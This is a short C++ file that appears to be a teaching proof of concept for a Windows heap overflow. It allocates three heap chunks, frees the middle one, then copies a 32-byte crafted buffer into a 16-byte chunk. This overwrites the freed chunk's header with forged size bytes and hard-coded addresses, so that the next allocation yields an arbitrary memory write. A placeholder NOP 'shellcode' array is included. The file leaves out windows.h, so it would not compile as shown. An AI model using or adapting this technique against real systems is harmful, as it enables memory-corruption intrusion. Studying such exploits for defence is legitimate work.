#include<iostream>
#include<cstring>

typedef void *HANDLE;
typedef void *HLOCAL;


  unsigned char shellcode[] = "\x90\x90\x90\x90";
  unsigned char malArg[] = "0123456789012345"
       "\x05\x00\x03\x00\x00\x00\x08\x00"
      "\xb8\xf5\x12\x00\x40\x90\x40\x00";

void mem() {
    HANDLE hp;
    HLOCAL h1 = 0, h2 = 0, h3 = 0, h4 = 0;
    hp = HeapCreate(0, 0x1000, 0x10000);
    h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
    h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128);
    h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);
    HeapFree(hp,0,h2);
    memcpy(h1, malArg, 32);
    h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 128);
    return;
}

int main(void) {
    mem();
    return 0;
}